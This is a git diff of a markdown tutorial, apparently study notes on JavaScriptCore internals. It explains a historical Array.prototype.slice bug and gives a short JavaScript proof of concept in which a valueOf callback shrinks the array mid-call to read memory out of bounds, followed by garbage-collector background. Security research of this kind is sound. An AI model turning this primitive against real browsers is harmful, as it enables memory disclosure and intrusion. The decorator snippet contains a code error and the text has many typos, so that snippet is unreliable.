@@ -66,40 +66,36 @@ expand to the left and right, similar to the wings of a butterfly. Presumably.
 
 # Functions
 
-When executing a function's body, two special variables become available. One of them *'arguments'* provides access to the arguments and caller of the
-function, thus enabling the creation of function with a varible number of arguments. The other *'this'* refers to different objects depending on the
-invocation of the function.
+When executing a function's body, two special variables become available. One of them *'arguments'* provides access to the arguments and caller of the function, thus enabling the creation of a function with a varible number of arguments. The other variable *'this'* refers to different objects depending on the invocation of the function.
 
-- If the function was called a constructor (using 'new func()'), then *'this'* points to the newly created object. Its proto has already been set to
-  the `.prototype` prop of the func object, which is set to the a new object during function definition. 
+- If the function was called using a constructor (using 'new func()'), then *'this'* points to the newly created object. Its proto has already been set to the `.prototype` prop of the func object, which is set to the a new object during function definition. 
 - If the function was called as a method of the same object (using 'obj.func()'), then *'this'* will point to the reference object. 
 - Else *'this'* simply points to the current global object, as it does outside of a function as well. 
 
-Since function are first class objects in JS they too can have props. Two interesting props of functions are `.call` and `.apply` which allow calling
-the function with a given *'this'* object and args. This can for example be used to implement decorator functionality: 
+Since function are first class objects in JS they too can have props. Two interesting props of functions are `.call` and `.apply` which allow calling the function with a given *'this'* object and args. This can for example be used to implement decorator functionality: 
 ```js
 function decorate(func) {
 	return function() {
 		for(var i=0;i < arguments.length; i++) {
+			// do something with each arg
 		}
 		return func.apply(this.arguments);
 	};
 }
 ```
-This also has some implications on the implementations of JS functions inside the engine as they cannot make any assumptions about the value of the
-reference object which they are called with, as it can be set to arbitrary values from script. Thus, all internal JS functions will need to check the
-type of not only their args but also of the *'this'* object.
+This also has some implications on the implementations of JS functions inside the engine as they cannot make any assumptions about the value of the reference object which they are called with, as it can be set to arbitrary values from script. Thus, all internal JS functions will need to check the type of not only their args but also of the *'this'* object.
 
 Internally, the built-in function and methods are usually implemented in one of two ways; as native functions in C++ of in JS itself. 
 
 # The bug
-The bug in question lies in the implementation of Array.prototype.slice. The native function arrayProtoFuncSlice, located in ArrayPrototype.cpp, is
-invoked whenever the slice method is called in JS
+The bug in question lies in the implementation of Array.prototype.slice. The native function arrayProtoFuncSlice, located in ArrayPrototype.cpp, is invoked whenever the slice method is called in JS
 ```js
+// slice
 var a = [1,2,3, 4]
 var s = a.slice(1,3)
 // s now contains [2,3]
 ```
+Internally this is how slice is implemented from a high-level perspective
 
 1. Obtain the ref object for the method call
 2. Retrieve the length of the array
@@ -140,4 +136,64 @@ Math.abs({valueOf: function() {return -42}})
 ```
 
 # Exploiting with `valueOf`
+
+In the case of `arrayProtoFuncSlice` the conversion to a primitive type is performed in `argumentClampedIndexFromStartOrEnd`. This method also clamps the argument to the range [0, length]:
+```c++
+JSValue value = exec->argument(argument);
+if (value.isUndefiend())
+	return undefinedValue;
+double indexDouble = value.toInteger(exec); // conversion happens here
+if (indexDouble < 0) {
+	indexDouble += length;
+	return indexDouble < 0 ? 0 : static_cast<unsigned>(indexDouble);
+}
+return indexDouble > length ? length : static_cast<unsigned>(indexDouble);
+```
+
+If we modify the length of the array inside a `valueOf` func of one of the previous args, then the implementation of slice will continue to use the previous length, resulting in an out-of-bounds access during the `memcpy`. 
+
+Before doing this however, we have to make sure that the element storage is actually resized if we shrink the array. For that let's have a quick look at the implementation of the `.length` setter. From `JSArray::newLength`:
+```c++
+unsigned lengthToClear = butterfly->publicLength() - newLength; 
+unsigned costToAllocateNewButterfly = 64 // a hueristic
+if (lengthToClear > newLength && lengthToClear > costToAllocateNewButterfly) {
+	reallocateAndShrinkButterfly(exec->vm(), newLength);
+	return true;
+}
+```
+This code implements a simple heuristic to avoid realocating the array too often. To force a realocation of our array we will thus need the new size to be much less then the old size. Resizing from e.g. 100 elements to 0 will do the trick.
+
+Here is how we can exploit `Array.prototype.slice`:
+```js
+var a = [];
+for (var i=0; i < 100; i++) {
+	a.push(i + 0.123);
+}
+var b = a.slice(0, {valueOf: function() { a.length = 0; return 10;}})
+// b = [0.123,1.123,2.12199579146e-313,0,0,,0,0,0,0]
+```
+The correct output would have been an array of size 10 filled 'undefined' values since the array has been declared propr to the slice op. However, we can see some float values in the array. Seems like we've read some stuff past the end of the array elements. 
+
+# Reflection 
+This particular programming mistake is not new and has been exploited for a while now. The core problem here is (mutable) state that is "cached" in a stack frame in combination with various callback mechanisms that can execute user supplied code further down in the call stack(in this case `valueOf`). With this setting it is quite easy to make false assumptions about the state of the engine throughout a function. The same kind of problem appears in the `DOM` as well due to various event callbacks.
+
+# JSC Heap
+At this point we have read data past our array but do not quite know what we are accesing there. To understand this, somne backgrounf knowledge about the JSC heap is required.
+
+# Garbage collector basics
+JS is a garbage collected language, meaning the programmer does not need to care about memory management. Instead, the garbage collector will collect unreachable objects from time to time.
+
+One approach to garbage collection is reference counting, which is used extensively in many applications. However, as of today, all major JS engines instead use a mark and sweep algo. Here the collector regularly scans all alive objects, starting from a set of root nodes, and afterwards frees all dead objects. The root nodes are usually pointers located on the stack as well as global objects like the 'window' object in a web browser context. 
+
+There are various distinctions between garbage collection sytems. We will now discull key properties of garbage collection systems which should help the reader understanbd some of the related code.
+
+JSC uses a conservative garbage collector. In essense, this means the GC does not keep track of the root nodes itself. Instead, during GC it will scan the stack for any value that could be a pointer into the heap and treat those as root nodes. In contrast e.g. `SpiderMonkey` uses a precise GC and thus needs to wrap all references to heap objects on the stack inside pointer class`(Rooted<>)` that takes care of registering the object with the GC.
+
+JSC uses an incremental GC. This kind if GC performs the marking in several steps and allows the app to run in between, reducing GC latency. However, this requires sonme additional effort to work correctly. Consider this:
+- The GC runs and visits some object 0 and all of its referenced objects. It marks them as visited and kater pauses so the application can run again.
+- 0 is modified and a new reference to another Object P is added to it,
+- Then the GC runs again but it doesn't know about P. It finished the marking phase and frees the memory of P.
+
+To avoid this scenario, so called write barriers are inserted into the engine. These take care of notifying the GC in such a scenario. These barriers are implemented in JSC with the `WriteBarrier<>` and `CopyBarrier<>` classes. 
+
 
